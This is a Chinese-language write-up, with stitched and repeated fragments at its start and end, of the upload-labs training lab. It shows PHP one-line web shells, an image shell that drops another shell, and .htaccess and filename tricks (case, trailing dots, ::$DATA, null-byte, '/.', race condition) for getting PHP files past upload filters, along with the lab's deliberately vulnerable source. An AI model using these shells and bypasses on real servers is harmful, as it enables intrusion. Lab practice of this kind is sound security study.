class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],$allow_type))&#123;        $msg = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-comment">//检查文件名</span>        $file = <span class="hljs-keyword">empty</span>($_POST[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : $_POST[<span class="hljs-string">&#x27;save_name&#x27;</span>];        <span class="hljs-keyword">if</span> (!is_array($file)) &#123;            $file = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower($file));        &#125;        $ext = end($file);        $allow_suffix = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);        <span class="hljs-keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;            $msg = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            $file_name = reset($file) . <span class="hljs-string">&#x27;.&#x27;</span> . $file[count($file) - <span class="hljs-number">1</span>];            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .$file_name;            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;                $msg = <span class="hljs-string">&quot;文件上传成功！&quot;</span>;                $is_upload = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                $msg = <span class="hljs-string">&quot;文件上传失败！&quot;</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    $msg = <span class="hljs-string">&quot;请选择要上传的文件！&quot;</span>;&#125;</code></pre><p>可以发现<code>$file_name</code>经过<code>reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>处理。</p><p>如果上传的是数组的话，会跳过<code>$file = explode(&#39;.&#39;, strtolower($file));</code>。并且后缀有白名单过滤</p><pre><code class="hljs xquery"><span class="hljs-variable">$ext</span> = <span class="hljs-keyword">end</span>(<span class="hljs-variable">$file</span>);<span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);</code></pre><p>而最终的文件名后缀取的是<code>$file[count($file) - 1]</code>，因此我们可以让<code>$file</code>为数组。<code>$file[0]</code>为<code>smi1e.php/</code>，也就是<code>reset($file)</code>，然后再令<code>$file[2]</code>为白名单中的jpg。此时<code>end($file)</code>等于jpg，<code>$file[count($file) - 1]</code>为空。而 <code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>，也就是<code>smi1e.php/.</code>，最终<code>move_uploaded_file</code>会忽略掉<code>/.</code>，最终上传<code>smi1e.php</code>。</p><p><strong>绕过</strong></p><p>burp抓包修改为数组，如下</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215181210201.png" alt="image-20210215181210201"></p><p>本文是upload-labs通关记录。</p><!-- more --><h3 id="前期准备-1"><a href="#前期准备-1" class="headerlink" title="前期准备"></a>前期准备</h3><p>制作一个一句话木马：<code>&lt;?php @eval($_POST[1]);?&gt;</code></p><p>制作一个图片马：<code>copy 1.jpg/b +ma.php/a ma.jpg</code></p><p>图片马内容：<code>&lt;?php  fputs(fopen(&#39;xx.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;); ?&gt;</code></p><h3 id="Pass-01：前端js验证-1"><a href="#Pass-01：前端js验证-1" class="headerlink" title="Pass-01：前端js验证"></a>Pass-01：前端js验证</h3><p>随意选个马子传一下，结果秒显不允许</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215110356885.png" alt="image-20210215110356885"></p><p>猜测前端js检查了，验证前端代码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215110544819.png" alt="image-20210215110544819"></p><p><strong>绕过</strong></p><p>关了浏览器的前端js验证。</p><p>当然你要是嫌关js麻烦，你传个图片马就o了</p><p>上传图片马，然后文件包含</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215154901813.png" alt="image-20210215154901813"></p><p>菜刀连接</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215154959908.png" alt="image-20210215154959908"></p><h3 id="Pass-02：MIME-1"><a href="#Pass-02：MIME-1" class="headerlink" title="Pass-02：MIME"></a>Pass-02：MIME</h3><p>老规矩，搞个马子传一下</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215122215429.png" alt="image-20210215122215429"></p><p>看一下后台源代码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215122237531.png" alt="image-20210215122237531"></p><p><strong>绕过</strong>验证MIME类型的，抓包改一下MIME为image/jpeg就o了</p><p>嫌抓包麻烦，直接传个图片马也可以。</p><h3 id="Pass-03：宽松的黑名单-1"><a href="#Pass-03：宽松的黑名单-1" class="headerlink" title="Pass-03：宽松的黑名单"></a>Pass-03：宽松的黑名单</h3><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215124206217.png" alt="image-20210215124206217"></p><p>一看黑名单验证，查看后台源码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215124326909.png" alt="image-20210215124326909"></p><p>果然。</p><p><strong>绕过</strong></p><p>这个黑名单限制不是很全，找一个没有在限制里面的后缀就可以绕过，比如php3，但是当上传的这些文件要被当作php来执行，需要有以下条件：即Apache的httpd.conf有如下配置代码</p><pre><code class="hljs jboss-cli">AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span> <span class="hljs-string">.phps</span> <span class="hljs-string">.php5</span> <span class="hljs-string">.pht</span> <span class="hljs-string">.ph3</span><span class="hljs-comment">#配置里面有你所上传的后缀</span></code></pre><p>此处黑名单没有过滤.htaccess后缀，故此处也可上传.htaccess文件进行绕过。</p><p>或者传个图片马</p><h3 id="Pass-04-htaccsess-1"><a href="#Pass-04-htaccsess-1" class="headerlink" title="Pass-04:.htaccsess"></a>Pass-04:.htaccsess</h3><p>找个马子试一下</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215125826838.png" alt="image-20210215125826838"></p><p>看了下后台，比较长，不好列举，就以提示给的tips列举</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215125736761.png" alt="image-20210215125736761"></p><p><strong>绕过</strong></p><p>可以看到没有限制.htaccsess文件，故可以上传.htaccsess文件绕过。内容如下</p><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php</code></pre><p>这样所有文件都会解析为php，然后再上传图片马，就可以解析为php</p><h3 id="Pass-05：后缀大小写-1"><a href="#Pass-05：后缀大小写-1" class="headerlink" title="Pass-05：后缀大小写"></a>Pass-05：后缀大小写</h3><p>查看后台，这回完犊子了，加了.htaccess</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215133655371.png" alt="image-20210215133655371"></p><p>仔细看后台源代码，并没有转换大小写</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215134635811.png" alt="image-20210215134635811"></p><p><strong>绕过</strong></p><p>更改马子的后缀大小写，例如：<code>ma.Php</code></p><h3 id="Pass-06-空格绕过-1"><a href="#Pass-06-空格绕过-1" class="headerlink" title="Pass-06:空格绕过"></a>Pass-06:空格绕过</h3><p>仔细看后台源码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215135013175.png" alt="image-20210215135013175"></p><p>相比于上面Pass-05代码，这里将文件后缀名统一进行了小写转换，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过。</p><p><strong>绕过</strong></p><p>抓包在filename后面加个空格</p><h3 id="Pass-07：点绕过-1"><a href="#Pass-07：点绕过-1" class="headerlink" title="Pass-07：点绕过"></a>Pass-07：点绕过</h3><p>仔细看后台</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215140041505.png" alt="image-20210215140041505"></p><p>可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。</p><p><strong>绕过</strong></p><p>抓包在filename后面加个“.”</p><h3 id="Pass-08-：-DATE-1"><a href="#Pass-08-：-DATE-1" class="headerlink" title="Pass-08 ：::$DATE"></a>Pass-08 ：::$DATE</h3><p>后台源码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215140137448.png" alt="image-20210215140137448"></p><p>可以看到，与前面第七关的代码相比，少了去除文件名的”::$DATA”字符串这一步。这里还是利用windows的一个特性。</p><blockquote><p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。</p></blockquote><p>简单讲就是在php+windows的情况下：如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名.且保持<code>&quot;::$DATA&quot;</code>之前的文件名。</p><p><em>注:仅windows适用</em></p><p><strong>绕过</strong></p><p>用burp将上传文件后缀改为:<code>xx.php::$DATA</code>即可</p><h3 id="Pass-09：点空格点-1"><a href="#Pass-09：点空格点-1" class="headerlink" title="Pass-09：点空格点"></a>Pass-09：点空格点</h3><p>后台</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215140532614.png" alt="image-20210215140532614"></p><p>可以看到，这里代码的安全性比之前的都要更高，黑名单类型全，大小写经过转换，去除了文件名末尾的点，去除了文件名尾空格，还去除了::$DATA。。但是，这里还是可以绕过的。这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。都只进行一次。</p><p><strong>绕过</strong></p><p>抓包构造点空格点进行绕过，也就是后缀名改为<code>xx.php. .</code></p><h3 id="Pass-10：双写绕过-1"><a href="#Pass-10：双写绕过-1" class="headerlink" title="Pass-10：双写绕过"></a>Pass-10：双写绕过</h3><p>后台</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215141032311.png" alt="image-20210215141032311"></p><p>分析注意：<strong>str_ireplace</strong>函数<strong>不区分大小写</strong>的替换字符串中的一些字符，此次源码将黑名单里的文件后缀名替换成空字符。</p><p><strong>绕过</strong></p><p>用burp修改后缀名为 <code>.pphphp</code></p><h3 id="Pass-11：00截断-1"><a href="#Pass-11：00截断-1" class="headerlink" title="Pass-11：00截断"></a>Pass-11：00截断</h3><p>查看后台源码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215141813823.png" alt="image-20210215141813823"></p><p>这里与之前代码相比，使用了白名单，只允许上传，jpg，png，gif三种格式文件。但是在进行move_uploaded_file前。利用<code>GET[&#39;save_path&#39;]</code>和随机时间函数进行拼接，拼接成文件存储路径。这里构造文件存储路径利用了_GET传入，导致服务器最终存储的文件名可控。故可以利用这个点进行绕过。</p><p><strong>绕过</strong></p><p>00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到0x00会截断</p><blockquote><p>截断条件：<br>1、php版本小于5.3.4<br>2、php.ini的magic_quotes_gpc为OFF状态</p></blockquote><p>抓包进行修改</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215142538909.png" alt="image-20210215142538909"></p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215142754495.png" alt="image-20210215142754495"></p><h3 id="Pass-12：-00-1"><a href="#Pass-12：-00-1" class="headerlink" title="Pass-12：%00"></a>Pass-12：%00</h3><p>后台源码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215143512734.png" alt="image-20210215143512734"></p><p>这里代码与上面Pass-11代码类似，不过是save_path参数由GET传入变为POST传入，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。</p><p><strong>绕过</strong></p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215145042313.png" alt="image-20210215145042313"></p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215145151607.png" alt="image-20210215145151607"></p><h3 id="Pass-13：文件头检测-1"><a href="#Pass-13：文件头检测-1" class="headerlink" title="Pass-13：文件头检测"></a>Pass-13：文件头检测</h3><p>这一关开始上传图片马，后台</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215161722242.png" alt="image-20210215161722242"></p><p>使用了 getReailFileType函数</p><p><strong>绕过</strong></p><p>burp抓包添加一个图片文件的文件幻数</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215161612151.png" alt="image-20210215161612151"></p><p>或者直接上传一张图片马即可。</p><h3 id="Pass-14：getimagesize-1"><a href="#Pass-14：getimagesize-1" class="headerlink" title="Pass-14：getimagesize"></a>Pass-14：getimagesize</h3><p>查看后台源码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215151630875.png" alt="image-20210215151630875"></p><p>使用了getimagesize函数来验证，加对应图片的文件头就o了</p><p>比如：gif-GIF89a</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215153117383.png" alt="image-20210215153117383"></p><p>或者传一个图片马子</p><h3 id="Pass-15：exif-imagetype-1"><a href="#Pass-15：exif-imagetype-1" class="headerlink" title="Pass-15：exif_imagetype()"></a>Pass-15：exif_imagetype()</h3><p>后台</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215153456115.png" alt="image-20210215153456115"></p><p><strong>绕过</strong></p><p>同13、14一样</p><h3 id="Pass-16：二次渲染-1"><a href="#Pass-16：二次渲染-1" class="headerlink" title="Pass-16：二次渲染"></a>Pass-16：二次渲染</h3><p>后台</p><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;$msg = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    <span class="hljs-comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span>    $filename = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];    $filetype = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];    $tmpname = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];    $target_path=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.basename($filename);    <span class="hljs-comment">// 获得上传文件的扩展名</span>    $fileext= substr(strrchr($filename,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);    <span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span>    <span class="hljs-keyword">if</span>(($fileext == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;        <span class="hljs-keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;            <span class="hljs-comment">//使用上传的图片生成新的图片</span>            $im = imagecreatefromjpeg($target_path);            <span class="hljs-keyword">if</span>($im == <span class="hljs-literal">false</span>)&#123;                $msg = <span class="hljs-string">&quot;该文件不是jpg格式的图片！&quot;</span>;                @unlink($target_path);            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-comment">//给新图片指定文件名</span>                srand(time());                $newfilename = strval(rand()).<span class="hljs-string">&quot;.jpg&quot;</span>;                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$newfilename;                imagejpeg($im,$img_path);                @unlink($target_path);                $is_upload = <span class="hljs-literal">true</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;        &#125;    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(($fileext == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;        <span class="hljs-keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;            <span class="hljs-comment">//使用上传的图片生成新的图片</span>            $im = imagecreatefrompng($target_path);            <span class="hljs-keyword">if</span>($im == <span class="hljs-literal">false</span>)&#123;                $msg = <span class="hljs-string">&quot;该文件不是png格式的图片！&quot;</span>;                @unlink($target_path);            &#125;<span class="hljs-keyword">else</span>&#123;                 <span class="hljs-comment">//给新图片指定文件名</span>                srand(time());                $newfilename = strval(rand()).<span class="hljs-string">&quot;.png&quot;</span>;                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$newfilename;                imagepng($im,$img_path);                @unlink($target_path);                $is_upload = <span class="hljs-literal">true</span>;                           &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;        &#125;    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(($fileext == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;        <span class="hljs-keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;            <span class="hljs-comment">//使用上传的图片生成新的图片</span>            $im = imagecreatefromgif($target_path);            <span class="hljs-keyword">if</span>($im == <span class="hljs-literal">false</span>)&#123;                $msg = <span class="hljs-string">&quot;该文件不是gif格式的图片！&quot;</span>;                @unlink($target_path);            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-comment">//给新图片指定文件名</span>                srand(time());                $newfilename = strval(rand()).<span class="hljs-string">&quot;.gif&quot;</span>;                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$newfilename;                imagegif($im,$img_path);                @unlink($target_path);                $is_upload = <span class="hljs-literal">true</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        $msg = <span class="hljs-string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;    &#125;&#125;</code></pre><p>可以看到，这里先是判断Content-Type，然后再用imagecreatefrom[gif|png|jpg]函数判断是否是图片格式，如果是图片的话再用image[gif|png|jpg]函数对其进行二次渲染。</p><p>这里就不再对比上传图片马前后的区别，直接结论：图片马的恶意内容被磨除了。</p><p><strong>绕过</strong></p><p>如果想要绕过二次渲染的话，就要搞清楚二次渲染后，源文件哪些区域不会被修改或压缩。这里因为gif、jpg、png三种不同图片文件的文件格式不同，所以图片马的构造方法也不同，具体可以参考我的上一篇文章中有总结：“文件上传”</p><h3 id="Pass-17：条件竞争时间差-1"><a href="#Pass-17：条件竞争时间差-1" class="headerlink" title="Pass-17：条件竞争时间差"></a>Pass-17：条件竞争时间差</h3><p>后台</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);    $file_name = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];    $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];    $file_ext = substr($file_name,strrpos($file_name,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);    $upload_file = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . $file_name;    <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;        <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;             $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_ext;             rename($upload_file, $img_path);             $is_upload = <span class="hljs-literal">true</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            $msg = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;            unlink($upload_file);        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;    &#125;&#125;</code></pre><p>不难发现，这里是先move_uploaded_file函数将上传文件临时保存，再进行判断，如果不在白名单里则unlink删除，在的话就rename重命名，所以这里存在条件竞争。</p><p><strong>绕过</strong></p><p>用burp开启两个intruder模块，一个用于重复上传，另一个用于重复访问。</p><p>1、先设置上传请求,记住此处的文件名，等下要用来拼接访问请求的url</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215163251176.png" alt="image-20210215163251176"></p><p>2、因为此处没有什么参数需要爆破，只是需要重复发起请求，所以payload设置为Null payloads,设置访问次数5000次，线程50个</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215164100568.png" alt="image-20210215164100568"></p><p>3、接下来设置访问请求<br>1、浏览器构造请求url：<code>http://127.0.0.1/upload-labs/upload/ma.Php</code>,进行访问，然后用burp抓包<br>2、burp抓包后发送至intruder模块，然后设置payload，这一步和上传请求设置差不多,都是Null payloads、5000次、50个线程</p><p>3、设置好两个模块后同时启动，观察结果，因为我们传入的php代码是<code>phpinfo();</code>,所以如果访问成功的话，会返回php的配置信息。</p><p>注意：条件竞争绕过存在一定概率，实践中如果一次不成功，可以多试几次。</p><p>另外一种方法，在上一篇文章中也讲过</p><p>也可以上传图片马</p><h3 id="Pass-18：突破上传重命名-1"><a href="#Pass-18：突破上传重命名-1" class="headerlink" title="Pass-18：突破上传重命名"></a>Pass-18：突破上传重命名</h3><p>这里先将上传的文件保存（move函数），再rename重命名一下。所以也存在条件竞争，绕过方法和上面Pass-17差不多，这里就不重复写了。这里先将上传的文件保存（move函数），再rename重命名一下。所以也存在条件竞争，绕过方法和上面Pass-17差不多，这里就不重复写了。</p><h3 id="Pass-19：-绕过-1"><a href="#Pass-19：-绕过-1" class="headerlink" title="Pass-19：./绕过"></a>Pass-19：./绕过</h3><p>后台</p><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;$msg = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);        $file_name = $_POST[<span class="hljs-string">&#x27;save_name&#x27;</span>];        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);        <span class="hljs-keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .$file_name;            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;                 $is_upload = <span class="hljs-literal">true</span>;            &#125;<span class="hljs-keyword">else</span>&#123;                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125;<span class="hljs-keyword">else</span>&#123;            $msg = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre><p>可以看到，这里img_path可控（通过post sava_name），所以可以利用move_uploaded_file的\x00截断(save_name=ma.php%00.jpg)绕过,但\x00截断之前关卡已经出现过了，这里明显是考察别的知识点。于是网上找找别人的答案，发现考点是:move_uploaded_file会忽略掉文件末尾的/.所以可以构造save_path=ma.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php</p><p><strong>绕过</strong></p><p>burp抓包末尾添加：<code>save_name=ma.php/.</code>，注意马的名字与filename一致</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215173229186.png" alt="image-20210215173229186"></p><p>当然也可以传个图片马子</p><p>也可以直接在上传处保存文件名哪里后面加<code>/</code>或者<code>.</code>都可</p><h3 id="Pass-20：数组-绕过-1"><a href="#Pass-20：数组-绕过-1" class="headerlink" title="Pass-20：数组/.绕过"></a>Pass-20：数组/.绕过</h3><p>后台代码</p><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;$msg = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;    <span class="hljs-comment">//检查MIME</span>    $allow_type = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);    <span class="hljs-keyword">if</span>(!in_array($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],$allow_type))&#123;        $msg = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-comment">//检查文件名</span>        $file = <span class="hljs-keyword">empty</span>($_POST[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : $_POST[<span class="hljs-string">&#x27;save_name&#x27;</span>];        <span class="hljs-keyword">if</span> (!is_array($file)) &#123;            $file = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower($file));        &#125;        $ext = end($file);        $allow_suffix = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);        <span class="hljs-keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;            $msg = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            $file_name = reset($file) . <span 